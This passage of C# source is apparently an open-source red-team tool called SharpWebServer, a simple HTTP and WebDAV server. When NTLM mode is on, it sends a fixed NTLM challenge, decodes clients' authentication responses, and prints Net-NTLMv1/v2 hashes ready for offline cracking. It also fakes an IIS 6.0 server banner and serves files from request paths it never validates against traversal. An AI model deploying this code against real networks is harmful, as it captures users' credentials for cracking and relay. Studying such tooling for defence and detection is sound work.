             {".trm", "application/x-msterminal"},
             {".tsv", "text/tab-separated-values"},
             {".ttc", "application/x-font-ttf"},
             {".ttf", "application/x-font-ttf"},
             {".twd", "application/vnd.simtech-mindmapper"},
             {".twds", "application/vnd.simtech-mindmapper"},
             {".txd", "application/vnd.genomatix.tuxedo"},
             {".txf", "application/vnd.mobius.txf"},
             {".txt", "text/plain"},
             {".u32", "application/x-authorware-bin"},
             {".udeb", "application/x-debian-package"},
             {".ufd", "application/vnd.ufdl"},
             {".ufdl", "application/vnd.ufdl"},
             {".umj", "application/vnd.umajin"},
             {".unityweb", "application/vnd.unity"},
             {".uoml", "application/vnd.uoml+xml"},
             {".uri", "text/uri-list"},
             {".uris", "text/uri-list"},
             {".urls", "text/uri-list"},
             {".ustar", "application/x-ustar"},
             {".utz", "application/vnd.uiq.theme"},
             {".uu", "text/x-uuencode"},
             {".vcd", "application/x-cdlink"},
             {".vcf", "text/x-vcard"},
             {".vcg", "application/vnd.groove-vcard"},
             {".vcs", "text/x-vcalendar"},
             {".vcx", "application/vnd.vcx"},
             {".vis", "application/vnd.visionary"},
             {".viv", "video/vnd.vivo"},
             {".vor", "application/vnd.stardivision.writer"},
             {".vox", "application/x-authorware-bin"},
             {".vrml", "model/vrml"},
             {".vsd", "application/vnd.visio"},
             {".vsf", "application/vnd.vsf"},
             {".vss", "application/vnd.visio"},
             {".vst", "application/vnd.visio"},
             {".vsw", "application/vnd.visio"},
             {".vtu", "model/vnd.vtu"},
             {".vxml", "application/voicexml+xml"},
             {".w3d", "application/x-director"},
             {".wad", "application/x-doom"},
             {".wav", "audio/x-wav"},
             {".wax", "audio/x-ms-wax"},
             {".wbmp", "image/vnd.wap.wbmp"},
             {".wbs", "application/vnd.criticaltools.wbs+xml"},
             {".wbxml", "application/vnd.wap.wbxml"},
             {".wcm", "application/vnd.ms-works"},
             {".wdb", "application/vnd.ms-works"},
             {".wiz", "application/msword"},
             {".wks", "application/vnd.ms-works"},
             {".wm", "video/x-ms-wm"},
             {".wma", "audio/x-ms-wma"},
             {".wmd", "application/x-ms-wmd"},
             {".wmf", "application/x-msmetafile"},
             {".wml", "text/vnd.wap.wml"},
             {".wmlc", "application/vnd.wap.wmlc"},
             {".wmls", "text/vnd.wap.wmlscript"},
             {".wmlsc", "application/vnd.wap.wmlscriptc"},
             {".wmv", "video/x-ms-wmv"},
             {".wmx", "video/x-ms-wmx"},
             {".wmz", "application/x-ms-wmz"},
             {".wpd", "application/vnd.wordperfect"},
             {".wpl", "application/vnd.ms-wpl"},
             {".wps", "application/vnd.ms-works"},
             {".wqd", "application/vnd.wqd"},
             {".wri", "application/x-mswrite"},
             {".wrl", "model/vrml"},
             {".wsdl", "application/wsdl+xml"},
             {".wspolicy", "application/wspolicy+xml"},
             {".wtb", "application/vnd.webturbo"},
             {".wvx", "video/x-ms-wvx"},
             {".x32", "application/x-authorware-bin"},
             {".x3d", "application/vnd.hzn-3d-crossword"},
             {".xap", "application/x-silverlight-app"},
             {".xar", "application/vnd.xara"},
             {".xbap", "application/x-ms-xbap"},
             {".xbd", "application/vnd.fujixerox.docuworks.binder"},
             {".xbm", "image/x-xbitmap"},
             {".xdm", "application/vnd.syncml.dm+xml"},
             {".xdp", "application/vnd.adobe.xdp+xml"},
             {".xdw", "application/vnd.fujixerox.docuworks"},
             {".xenc", "application/xenc+xml"},
             {".xer", "application/patch-ops-error+xml"},
             {".xfdf", "application/vnd.adobe.xfdf"},
             {".xfdl", "application/vnd.xfdl"},
             {".xht", "application/xhtml+xml"},
             {".xhtml", "application/xhtml+xml"},
             {".xhvml", "application/xv+xml"},
             {".xif", "image/vnd.xiff"},
             {".xla", "application/vnd.ms-excel"},
             {".xlam", "application/vnd.ms-excel.addin.macroenabled.12"},
             {".xlb", "application/vnd.ms-excel"},
             {".xlc", "application/vnd.ms-excel"},
             {".xlm", "application/vnd.ms-excel"},
             {".xls", "application/vnd.ms-excel"},
             {".xlsb", "application/vnd.ms-excel.sheet.binary.macroenabled.12"},
             {".xlsm", "application/vnd.ms-excel.sheet.macroenabled.12"},
             {".xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"},
             {".xlt", "application/vnd.ms-excel"},
             {".xltm", "application/vnd.ms-excel.template.macroenabled.12"},
             {".xltx", "application/vnd.openxmlformats-officedocument.spreadsheetml.template"},
             {".xlw", "application/vnd.ms-excel"},
             {".xml", "application/xml"},
             {".xo", "application/vnd.olpc-sugar"},
             {".xop", "application/xop+xml"},
             {".xpdl", "application/xml"},
             {".xpi", "application/x-xpinstall"},
             {".xpm", "image/x-xpixmap"},
             {".xpr", "application/vnd.is-xpr"},
             {".xps", "application/vnd.ms-xpsdocument"},
             {".xpw", "application/vnd.intercon.formnet"},
             {".xpx", "application/vnd.intercon.formnet"},
             {".xsl", "application/xml"},
             {".xslt", "application/xslt+xml"},
             {".xsm", "application/vnd.syncml+xml"},
             {".xspf", "application/xspf+xml"},
             {".xul", "application/vnd.mozilla.xul+xml"},
             {".xvm", "application/xv+xml"},
             {".xvml", "application/xv+xml"},
             {".xwd", "image/x-xwindowdump"},
             {".xyz", "chemical/x-xyz"},
             {".zaz", "application/vnd.zzazz.deck+xml"},
             {".zip", "application/zip"},
             {".zir", "application/vnd.zul"},
             {".zirz", "application/vnd.zul"},
             {".zmm", "application/vnd.handheld-entertainment+xml" }
            #endregion
        };
        private TcpListener _listener;
        private string _RootDirectory;
        private bool _AllowCors;
        private bool _Verbose;
        private bool _NTLM;
        private int _Port;

        public SharpWebServer(string directoryPath, int port, bool ntlm = false, bool verbose = false)
        {
            _RootDirectory = directoryPath;
            _AllowCors = false;
            _Verbose = verbose;
            _NTLM = ntlm;
            _Port = port;
        }

        private void Initialize()
        {
            _listener = new TcpListener(System.Net.IPAddress.Any, _Port);
            try
            {
                _listener.Start();
            }
            catch(Exception ex)
            {
                Console.WriteLine($"[!] Could not instantiate TCP listener: Port already taken?\n    Exception: {ex}");
                System.Environment.Exit(0);
            }

            ThreadPool.QueueUserWorkItem(Listen, null);
        }

        public void Stop()
        {
            if (_listener != null)
            {
                _listener.Stop();
                _listener = null;
            }
        }

        private void Log(string txt)
        {
            if (_Verbose)
            {
                Output("SharpWebServer [" + DateTime.Now.ToString("dd.MM.yy, HH:mm:ss") + $"] {txt}");
            }
        }

        private void Listen(object token)
        {
            while(_listener != null)
            {
                try
                {
                    var client = _listener.AcceptTcpClient();
                    ThreadPool.QueueUserWorkItem(HandleClient, client);
                }
                catch (Exception e)
                {
                    Output($"[*] Exception occurred : {e.Message}");
                }
            }
        }

        public struct MyRequest
        {
            public IPEndPoint remoteEndpoint;
            public IPEndPoint localEndpoint;
            public string PeerIP;
            public string HttpMethod;
            public string Uri;
            public string HttpVersion;
            public string Body;
            public Dictionary<string, string> Headers;
        }

        private struct MyResponse
        {
            public Dictionary<string, string> Headers;
            public string HttpVersion;
            public int StatusCode;
            public string StatusMessage;
            public byte[] Output;
            public string ContentType;
            public long ContentLength;
        }

        private void SocketSetKeepAlive(TcpClient client)
        {
            // https://darchuk.net/2019/01/04/c-setting-socket-keep-alive/

            // Get the size of the uint to use to back the byte array
            int size = Marshal.SizeOf((uint)0);

            // Create the byte array
            byte[] keepAlive = new byte[size * 3];

            // Pack the byte array:

            // Turn keepalive on
            Buffer.BlockCopy(BitConverter.GetBytes((uint)1), 0, keepAlive, 0, size);

            // Set amount of time without activity before sending a keepalive to 5 seconds
            Buffer.BlockCopy(BitConverter.GetBytes((uint)5000), 0, keepAlive, size, size);

            // Set keepalive interval to 5 seconds
            Buffer.BlockCopy(BitConverter.GetBytes((uint)5000), 0, keepAlive, size * 2, size);

            // Set the keep-alive settings on the underlying Socket
            client.Client.IOControl(IOControlCode.KeepAliveValues, keepAlive, null);
        }

        private void HandleClient(object token)
        {
            try
            {
                var client = token as TcpClient;
                string peerIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                var stream = client.GetStream();

                using (var reader = new StreamReader(stream))
                {
                    var writer = new StreamWriter(stream);
                    var requestFinished = 0;
                    var state = 0;

                    var response = new MyResponse
                    {
                        Headers = new Dictionary<string, string>(),
                        Output = null,
                        HttpVersion = "HTTP/1.1",
                        ContentType = "",
                    };

                    var request = new MyRequest
                    {
                        Headers = new Dictionary<string, string>(StringComparer.InvariantCultureIgnoreCase),
                        remoteEndpoint = ((IPEndPoint)client.Client.RemoteEndPoint),
                        localEndpoint = ((IPEndPoint)client.Client.LocalEndPoint),
                    };

                    while (requestFinished == 0)
                    {
                        if (state == 0)
                        {
                            var lineInput = reader.ReadLine();
                            if(lineInput == null || lineInput.Length == 0 || lineInput.IndexOf(' ') == -1)
                            {
                                requestFinished = 1;
                                client.Close();
                                break;
                            }

                            var line = lineInput.Split(' ');

                            request.HttpMethod = line[0];
                            request.Uri = line[1];
                            request.HttpVersion = line[2];
                            state = 1;
                        }
                        else
                        {
                            var lineInput = reader.ReadLine();
                            if (lineInput == "")
                            {
                                request.Body = "";
                                int peekChar = 0;

                                while((peekChar = reader.Peek()) != -1)
                                {
                                    request.Body += (char)reader.Read();
                                }

                                Process(ref request, ref response);
                                var output = PrepareResponse(ref request, ref response);

                                writer.BaseStream.Write(output, 0, output.Length);
                                writer.Flush();

                                System.Threading.Thread.Sleep(500);

                                if (response.Headers.ContainsKey("Connection") && response.Headers["Connection"].ToLower().Equals("close"))
                                {
                                    requestFinished = 1;
                                    client.Close();
                                }
                                else
                                {
                                    SocketSetKeepAlive(client);

                                    state = 0;
                                    response = new MyResponse
                                    {
                                        Headers = new Dictionary<string, string>(),
                                        Output = null,
                                        HttpVersion = "HTTP/1.1",
                                        ContentType = ""
                                    };
                                    request = new MyRequest
                                    {
                                        Headers = new Dictionary<string, string>(StringComparer.InvariantCultureIgnoreCase),
                                        remoteEndpoint = ((IPEndPoint)client.Client.RemoteEndPoint),
                                        localEndpoint = ((IPEndPoint)client.Client.LocalEndPoint),
                                    };
                                }
                            }
                            else
                            {
                                var pos = lineInput.IndexOf(':');
                                if(pos != -1 && (pos + 1) < lineInput.Length)
                                {
                                    request.Headers.Add(lineInput.Substring(0, pos), lineInput.Substring(pos+1).TrimStart());
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Output($"[*] Exception occurred : {e.Message}");
            }
        }

        private byte[] PrepareResponse(ref MyRequest request, ref MyResponse response)
        {
            if (response.ContentLength > 0 && !response.Headers.ContainsKey("content-length"))
            {
                response.Headers.Add("Content-Length", response.ContentLength.ToString());
            }

            if(!response.Headers.ContainsKey("Content-Type") && response.ContentType.Length > 0)
            {
                response.Headers.Add("Content-Type", response.ContentType);
            }

            response.Headers.Add("Server", "Microsoft-IIS/6.0");
            response.Headers.Add("Date", DateTime.Now.ToString("r"));

            using (var outp = new MemoryStream())
            {
                using (var writer = new StreamWriter(outp))
                {
                    writer.Write($"{response.HttpVersion} {response.StatusCode} {response.StatusMessage}\r\n");
                    foreach (var k in response.Headers.Keys)
                    {
                        writer.Write($"{k}: {response.Headers[k]}\r\n");
                    }

                    writer.Write("\r\n");
                    writer.Flush();

                    if (response.Output != null && response.Output.Length > 0)
                    {
                        writer.BaseStream.Write(response.Output, 0, response.Output.Length);
                    }

                    return outp.ToArray();
                }
            }
        }

        private static string DecodeNTLM(byte[] NTLM)
        {
            var LMHash_len = BitConverter.ToInt16(NTLM, 12);
            var LMHash_offset = BitConverter.ToInt16(NTLM, 16);
            var LMHash = NTLM.Skip(LMHash_offset).Take(LMHash_len).ToArray();
            var NTHash_len = BitConverter.ToInt16(NTLM, 20);
            var NTHash_offset = BitConverter.ToInt16(NTLM, 24);
            var NTHash = NTLM.Skip(NTHash_offset).Take(NTHash_len).ToArray();
            var User_len = BitConverter.ToInt16(NTLM, 36);
            var User_offset = BitConverter.ToInt16(NTLM, 40);
            var User = NTLM.Skip(User_offset).Take(User_len).ToArray();
            var UserString = System.Text.Encoding.Unicode.GetString(User);

            if (NTHash_len == 24)
            {  
                // NTLMv1
                var HostName_len = BitConverter.ToInt16(NTLM, 46);
                var HostName_offset = BitConverter.ToInt16(NTLM, 48);
                var HostName = NTLM.Skip(HostName_offset).Take(HostName_len).ToArray();
                var HostNameString = System.Text.Encoding.Unicode.GetString(HostName);
                var retval = UserString + "::" + HostNameString + ":" + LMHash + ":" + NTHash + ":1122334455667788";
                return retval;
            }
            else if (NTHash_len > 24)
            { 
                // NTLMv2
                NTHash_len = 64;
                var Domain_len = BitConverter.ToInt16(NTLM, 28);
                var Domain_offset = BitConverter.ToInt16(NTLM, 32);
                var Domain = NTLM.Skip(Domain_offset).Take(Domain_len).ToArray();
                var DomainString = System.Text.Encoding.Unicode.GetString(Domain);
                var HostName_len = BitConverter.ToInt16(NTLM, 44);
                var HostName_offset = BitConverter.ToInt16(NTLM, 48);
                var HostName = NTLM.Skip(HostName_offset).Take(HostName_len).ToArray();
                var HostNameString = System.Text.Encoding.Unicode.GetString(HostName);

                var NTHash_part1 = System.BitConverter.ToString(NTHash.Take(16).ToArray()).Replace("-", "");
                var NTHash_part2 = BitConverter.ToString(NTHash.Skip(16).Take(NTLM.Length).ToArray()).Replace("-", "");
                var retval = UserString + "::" + DomainString + ":1122334455667788:" + NTHash_part1 + ":" + NTHash_part2;
                return retval;
            }

            Output("[!] SharpWebServer: Could not parse NTLM hash");
            return "";
        }

        private void Process(ref MyRequest request, ref MyResponse response)
        {
            bool process = true;
            if(_NTLM)
            {
                if (!request.Headers.ContainsKey("authorization"))
                {
                    response.StatusCode = (int)HttpStatusCode.Unauthorized;
                    response.StatusMessage = "Unauthorized";
                    response.HttpVersion = "HTTP/1.1";
                    response.Headers.Add("WWW-Authenticate", "NTLM");
                    response.Headers.Add("Connection", "keep-alive");
                    response.Headers.Add("Content-Length", "0");

                    process = false;
                    Log("NTLM: Sending 401 Unauthorized due to lack of Authorization header.");
                }
                else
                {
                    var auth = request.Headers["authorization"].Split();
                    process = false;

                    if (auth[0] == "NTLM")
                    {
                        auth[1] = auth[1].TrimStart();
                        byte[] NTLMHash = System.Convert.FromBase64String(auth[1]);

                        // NTLM type 3 message - client's response
                        if (NTLMHash[8] == 3)
                        {
                            var NTLMHashString = DecodeNTLM(NTLMHash);
                            Output("\n[+] SharpWebServer: Net-NTLM hash captured:");
                            Output(NTLMHashString + "\n");
                            process = true;
                        }
                    }

                    if(!process)
                    {
                        Log("NTLM: Sending 401 Unauthorized with NTLM Challenge Response.");

                        response.StatusCode = (int)HttpStatusCode.Unauthorized;
                        response.StatusMessage = "Unauthorized";
                        response.Headers.Add("WWW-Authenticate", "NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==");
                        response.Headers.Add("Connection", "keep-alive");
                        response.Headers.Add("Content-Length", "0");
                    }
                }
            }

            if (process)
            {
                if (request.HttpMethod.ToLower() == "get")
                    OnProcessGET(ref request, ref response);

                else if (request.HttpMethod.ToLower() == "head")
                    OnProcessHEAD(ref request, ref response);

                else if (request.HttpMethod.ToLower() == "options")
                    OnProcessOPTIONS(ref request, ref response);

                else if (request.HttpMethod.ToLower() == "propfind")
                    OnProcessPROPFIND(ref request, ref response);

                response.Headers.Add("Connection", "Close");
            }

            long sizeInBytes = 0;
            if(response.ContentLength > 0)
            {
                sizeInBytes = response.ContentLength;
            }

            Log($"{request.PeerIP} - \"{request.HttpMethod} {request.Uri}\" - len: {sizeInBytes} ({response.StatusCode})");
        }

        private void OnProcessOPTIONS(ref MyRequest request, ref MyResponse response)
        {
            try
            {
                response.StatusCode = (int)HttpStatusCode.OK;
                response.StatusMessage = "OK";
                response.Headers.Add("Allow", "GET, HEAD, OPTIONS, PROPFIND");
                response.Headers.Add("Dav", "1,2");
                response.Headers.Add("MS-Author-Via", "DAV");
            }
            catch (Exception ex)
            {
                response.StatusCode = (int)HttpStatusCode.InternalServerError;
                response.StatusMessage = "Internal Server Error";
                Output($"[!] Exception occured in OPTIONS : {ex}");
            }
        }

        private void OnProcessGET(ref MyRequest request, ref MyResponse response)
        {
            string fileName = null;
            try
            {
                fileName = GetRequestedFileName(ref request);
                string filePath = fileName == null ? null : Path.Combine(_RootDirectory, fileName);

                if(filePath == null || filePath.Length == 0)
                {
                    response.StatusCode = (int)HttpStatusCode.OK;
                    response.StatusMessage = "OK";
                    return;
                }
                else if (!File.Exists(filePath))
                {
                    response.StatusCode = (int)HttpStatusCode.NotFound;
                    response.StatusMessage = "Not Found";
                    return;
                }

                ReturnFile(filePath, ref response);
            }
            catch (Exception ex)
            {
                response.StatusCode = (int)HttpStatusCode.InternalServerError;
                response.StatusMessage = "Internal Server Error";
                Output($"[!] Exception occured while serving file: {fileName} . Exception: {ex}");
            }
        }

        private void OnProcessHEAD(ref MyRequest request, ref MyResponse response)
        {
            string fileName = null;
            try
            {
                fileName = GetRequestedFileName(ref request);
                string filePath = fileName == null ? null : Path.Combine(_RootDirectory, fileName);

                if (filePath.Length == 0)
                {
                    response.StatusCode = (int)HttpStatusCode.OK;
                    response.StatusMessage = "OK";
                }
                else if (filePath == null || !File.Exists(filePath))
                {
                    response.StatusCode = (int)HttpStatusCode.NotFound;
                    response.StatusMessage = "Not Found";
                }

                return;
            }
            catch (Exception ex)
            {
                response.StatusCode = (int)HttpStatusCode.InternalServerError;
                response.StatusMessage = "Internal Server Error";
                Output($"[!] Exception occured while serving file: {fileName} . Exception: {ex}");
            }
        }

        private void OnProcessPROPFIND(ref MyRequest request, ref MyResponse response)
        {
            string fileName = null;
            try
            {
                fileName = GetRequestedFileName(ref request);
                string filePath = fileName == null ? null : Path.Combine(_RootDirectory, fileName);

                if (filePath.Length == 0 || filePath == null)
                {
                    filePath = _RootDirectory;
                }

                if (File.Exists(filePath) || Directory.Exists(filePath))
                {
                    ProcessPropfind(filePath, ref request, ref response);
                }
                else
                {
                    response.StatusCode = (int)HttpStatusCode.NotFound;
                    response.StatusMessage = "Not Found";
                }
            }
            catch (Exception ex)
            {
                response.StatusCode = (int)HttpStatusCode.InternalServerError;
                response.StatusMessage = "Internal Server Error";
                Output($"[!] Exception occured while serving file: {fileName} . Exception: {ex}");
            }
        }

        private void GeneratePropfindXml(ref XmlWriter writer, bool isFile, string filePath, ref MyRequest request, ref MyResponse response, int depth = 0)
        {
            string host = request.localEndpoint.ToString();
            if (request.Headers.ContainsKey("host")) host = request.Headers["Host"];

            string path = filePath.Replace(_RootDirectory, "").Replace('\\', '/');
            if (path.StartsWith("/")) path = path.Substring(1);
            if (!isFile && path.EndsWith("/")) path = path.Substring(0, path.Length - 1);

            string serverUrl = "http://" + host + "/" + path;

            writer.WriteStartElement("D", "response", "DAV:");
            writer.WriteAttributeString("xmlns", "ns1", null, "NS2");
            writer.WriteStartElement("D", "href", "DAV:");
            writer.WriteString(serverUrl);
            writer.WriteEndElement();
            writer.WriteStartElement("D", "propstat", "DAV:");
            writer.WriteStartElement("D", "prop", "DAV:");

            writer.WriteStartElement("D", "creationdate", "DAV:");
            DateTime creation = File.GetCreationTime(filePath);
            writer.WriteString(creation.ToString("yyyy-MM-ddTHH:mm:ssZ"));
            writer.WriteEndElement(); //creationdate

            writer.WriteStartElement("D", "getcontentlength", "DAV:");

            if (isFile)
            {
                var size = new System.IO.FileInfo(filePath).Length;
                writer.WriteString(size.ToString());
            }
            else
            {
                writer.WriteString("0");
            }

            writer.WriteEndElement(); //getcontentlength

            if (!isFile)
            {
                writer.WriteStartElement("D", "getcontenttype", "DAV:");
                writer.WriteString("httpd/unix-directory");
                writer.WriteEndElement();
            }

            writer.WriteStartElement("D", "getlastmodified", "DAV:");
            DateTime writetime = File.GetLastWriteTime(filePath);
            writer.WriteString(writetime.ToString("ddd, dd MMM yyyy HH:mm:ss K"));
            writer.WriteEndElement(); //getlastmodified

            writer.WriteStartElement("D", "lockdiscovery", "DAV:");
            writer.WriteString("");
            writer.WriteEndElement();

            writer.WriteStartElement("D", "resourcetype", "DAV:");
            if (!isFile)
            {
                writer.WriteStartElement("D", "collection", "DAV:");
                writer.WriteEndElement(); //collection
            }
            writer.WriteEndElement(); //resourcetype

            writer.WriteStartElement("D", "supportedlock", "DAV:");
            writer.WriteStartElement("D", "lockentry", "DAV:");
            writer.WriteStartElement("D", "lockscope", "DAV:");
            writer.WriteStartElement("D", "exclusive", "DAV:");
            writer.WriteEndElement(); //exclusive
            writer.WriteEndElement(); //lockscope

            writer.WriteStartElement("D", "locktype", "DAV:");
            writer.WriteStartElement("D", "write", "DAV:");
            writer.WriteEndElement(); //write
            writer.WriteEndElement(); //locktype

            writer.WriteEndElement(); //lockentry
            writer.WriteEndElement(); //supportedlock

            writer.WriteEndElement(); //prop

            writer.WriteStartElement("D", "status", "DAV:");
            writer.WriteString($"{response.HttpVersion} 200 OK");
            writer.WriteEndElement(); //status

            writer.WriteEndElement(); //propstat

            writer.WriteStartElement("D", "propstat", "DAV:");
            writer.WriteStartElement("D", "prop", "DAV:");

            writer.WriteStartElement("D", "getcontentlanguage", "DAV:");
            writer.WriteEndElement();

            if (isFile)
            {
                writer.WriteStartElement("D", "getcontenttype", "DAV:");
                writer.WriteString(GetContentType(filePath));
                writer.WriteEndElement();
            }

            writer.WriteStartElement("D", "getetag", "DAV:");
            writer.WriteEndElement();
            writer.WriteStartElement("D", "source", "DAV:");
            writer.WriteEndElement();
            writer.WriteStartElement("ns1", "p1", "NS2");
            writer.WriteEndElement();
            writer.WriteStartElement("ns1", "p2", "NS2");
            writer.WriteEndElement();

            writer.WriteEndElement(); //prop

            writer.WriteStartElement("D", "status", "DAV:");
            writer.WriteString($"{response.HttpVersion} 404 Not Found");
            writer.WriteEndElement(); //status

            writer.WriteEndElement(); //propstat

            writer.WriteEndElement(); //response
        }

        private string GetPropfindResponse(string filePath, ref MyRequest request, ref MyResponse response, int depth = 0)
        {
            bool isFile = File.Exists(filePath);

            using (var sw = new StringWriter())
            {
                XmlWriterSettings settings = new XmlWriterSettings();
                settings.Encoding = System.Text.Encoding.UTF8;

                XmlWriter writer = XmlWriter.Create(sw, settings);
                writer.WriteStartDocument();

                writer.WriteStartElement("D", "multistatus", "DAV:");

                GeneratePropfindXml(ref writer, isFile, filePath, ref request, ref response);

                if (depth > 0 && !isFile)
                {
                    foreach (string file in Directory.GetFiles(filePath))
                    {
                        bool isFile2 = File.Exists(file);
                        GeneratePropfindXml(ref writer, isFile2, file, ref request, ref response, depth);
                    }

                    foreach (string file in Directory.GetDirectories(filePath))
                    {
                        bool isFile2 = File.Exists(file);
                        GeneratePropfindXml(ref writer, isFile2, file, ref request, ref response, depth);
                    }
                }

                writer.WriteEndElement(); //multistatus
                writer.WriteEndDocument();

                writer.Flush();
                writer.Close();

                string strxml = sw.ToString() + "\n";
                strxml = strxml.Replace("utf-16", "utf-8");
                return strxml;
            }
        }

        private void ProcessPropfind(string filePath, ref MyRequest request, ref MyResponse response)
        {
            response.ContentType = "text/xml; encoding=\"utf-8\"";

            XmlDocument xml = new XmlDocument();
            if (request.Body.Length != 0)
            {
                try
                {
                    //xml.LoadXml(request.Body);
                }
                catch (Exception ex)
                {
                    response.StatusCode = (int)HttpStatusCode.InternalServerError;
                    response.StatusMessage = "Internal Server Error";
                    Output($"[!] Exception occured while parsing XML in PROPFIND: {ex}");
                    return;
                }
            }
            else
            {
                response.StatusCode = (int)207;
                response.StatusMessage = "Multi-Status";

                int depth = 0;
                if (request.Headers.ContainsKey("depth"))
                {
                    try
                    {
                        depth = Int32.Parse(request.Headers["Depth"]);
                    }
                    catch (Exception ex)
                    {
                        response.StatusCode = (int)HttpStatusCode.InternalServerError;
                        response.StatusMessage = "Internal Server Error";
                        Output($"[!] Exception occured while parsing WebDAV Depth header: {ex}");
                        return;
                    }
                }

                response.Output = Encoding.ASCII.GetBytes(GetPropfindResponse(filePath, ref request, ref response, depth));
                response.ContentLength = response.Output.Length;
                response.Headers.Add("DAV", "1,2");
            }
        }

        private void ReturnFile(string filePath, ref MyResponse response)
        {
            using (Stream input = new FileStream(filePath, FileMode.Open))
            {
                response.ContentType = GetContentType(filePath);
                response.ContentLength = input.Length;
                
                //response.Headers.Add("Last-Modified", System.IO.File.GetLastWriteTime(filePath).ToString("r"));

                if (_AllowCors)
                    response.Headers.Add("Access-Control-Allow-Origin", "*");

                response.Output = ReadFully(input);
                response.StatusCode = (int)HttpStatusCode.OK;
                response.StatusMessage = "OK";
            }
        }

        private string GetRequestedFileName(ref MyRequest request)
        {
            string fileName = request.Uri.Substring(1);
            if (string.IsNullOrEmpty(fileName))
                fileName = GetExistingIndexFileName();
            return fileName;
        }

        public static byte[] ReadFully(Stream input)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                input.CopyTo(ms);
                return ms.ToArray();
            }
        }

        private string GetContentType(string filePath)
        {
            string mime;
            if (_MimeTypeMappings.TryGetValue(Path.GetExtension(filePath), out mime))
                return mime;

            return "application/octet-stream";
        }
        private string GetExistingIndexFileName()
        {
            foreach (string indexFile in _IndexFiles)
            {
                if (File.Exists(Path.Combine(_RootDirectory, indexFile)))
                {
                    return indexFile;
                }
            }
            return null;
        }

        static void Usage()
        {
            Output(@"Usage:
    SharpWebServer.exe <port=port> [dir=path] [verbose=true] [ntlm=true] [logfile=path]

Options:
    port    - TCP Port number on which to listen (1-65535)
    dir     - Directory with files to be hosted.
    verbose - Turn verbose mode on.
    seconds - Specifies how long should the server be running. Default: indefinitely
    ntlm    - Require NTLM Authentication before serving files. Useful to collect NetNTLM hashes 
              (in MDSec's Farmer style)
    logfile - Path to output logfile.
");
        }

        static void Output(string txt)
        {
            if(outputToFile.Length > 0)
            {
                File.AppendAllText(outputToFile, txt + Environment.NewLine);
            }
            else
            {
                Console.WriteLine(txt);
            }
        }

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Output(@"
    :: SharpWebServer ::
    a Red Team oriented C# Simple HTTP & WebDAV Server with Net-NTLM hashes capture functionality

Authors: 
    - Dominic Chell (@domchell) from MDSec                - Net-NTLM hashes capture code borrowed from Farmer
    - Mariusz B. / mgeeky, <mb [at] binary-offensive.com> - WebDAV implementation, NTLM Authentication keep-alive,
                                                            all the rest.
");
                Usage();
                return;
            }

            Output(@"
    :: SharpWebServer ::
    a Red Team oriented C# Simple HTTP Server with Net-NTLMv1/2 hashes capture functionality
");

            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }

            if (!arguments.ContainsKey("port"))
            {
                Usage();
                return;
            }

            int port = Int32.Parse(arguments["port"]);
            if (port < 0 || port > 65535)
            {
                Output("[!] Port must be in range <1, 65535>");
                return;
            }

            Output($"[.] Serving HTTP server on port  : {port}");

            string dir = Directory.GetCurrentDirectory();
            if (arguments.ContainsKey("dir"))
            {
                dir = arguments["dir"];
            }

            if (arguments.ContainsKey("logfile"))
            {
                Output("[.] Will write output to logfile : " + arguments["logfile"]);
                outputToFile = arguments["logfile"];
            }

            int seconds = 0;
            if (arguments.ContainsKey("seconds"))
            {
                seconds = Int32.Parse(arguments["seconds"]);
                Output($"[.] Will run for this long       : {seconds} seconds");
            }

            bool verbose = false;
            if (arguments.ContainsKey("verbose") && arguments["verbose"].ToLower().Equals("true"))
            {
                Output($"[.] Verbose mode turned on.");
                verbose = true;
            }

            bool ntlm = false;
            if (arguments.ContainsKey("ntlm") && arguments["ntlm"].ToLower().Equals("true"))
            {
                Output($"[.] NTLM mode turned on.");
                ntlm = true;
            }

            Output($"[.] Serving files from directory : {dir}\n");

            var server = new SharpWebServer(dir, port, ntlm, verbose);

            server.Initialize();

            if (seconds == 0)
            {
                // loop indefinitely until something stops
                while (true)
                { 
                    System.Threading.Thread.Sleep(1000); 
                }
            }
            else
            {
                // loop until the timer runs out
                while (seconds > 0)
                {
                    System.Threading.Thread.Sleep(1000);
                    seconds--;
                }

                Output($"[.] SharpWebServer time to listen elapsed. Bye!");

                server.Stop();
                System.Environment.Exit(0);
            }
        }
    }
}